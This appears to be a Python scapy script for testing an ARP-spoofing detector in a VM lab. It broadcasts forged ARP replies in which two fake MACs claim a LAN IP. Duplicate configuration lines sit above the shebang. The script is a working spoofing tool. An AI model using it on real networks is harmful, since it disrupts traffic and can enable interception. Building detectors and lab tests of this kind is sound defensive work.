IF = "enp0s3"
TARGET_IP = "10.0.2.2"
COUNT = 5
INTERVAL = 1.0
#!/usr/bin/env python3
from scapy.all import sendp, Ether, ARP, get_if_hwaddr
import time
import sys

# Set interface (find it with `ip a` or `ip -brief link`)
IF = "enp0s3"   # <- replace with your VM interface name if different
TARGET_IP = "192.168.1.1"  # IP to claim (the detector expects an IP already in your LAN)
COUNT = 5
INTERVAL = 1.0

# Two different fake MACs to create conflict
FAKE_MACS = ["00:11:22:33:44:55", "66:77:88:99:aa:bb"]

print(f"[+] Using interface {IF} to claim IP {TARGET_IP} with two MACs")

for mac in FAKE_MACS:
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)/ARP(op=2, hwsrc=mac, psrc=TARGET_IP, pdst="255.255.255.255")
    for i in range(COUNT):
        sendp(pkt, iface=IF, verbose=False)
        print(f"Sent ARP reply: {mac} -> {TARGET_IP}")
        time.sleep(INTERVAL)

print("[+] Done sending spoofed ARP replies.")
